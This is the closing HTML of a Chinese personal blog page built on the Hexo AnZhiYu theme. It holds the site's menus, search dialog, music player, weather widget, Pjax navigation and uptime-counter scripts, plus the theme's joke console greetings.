0.88rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("10/04/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2023 By 安知鱼 V1.6.8",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Sherlock 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("10/04/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      img.src = "https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-下班啦.svg";
      img.title = "下班了就该开开心心的玩耍，嘿嘿~";
      img.alt = "下班了就该开开心心的玩耍，嘿嘿~";

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>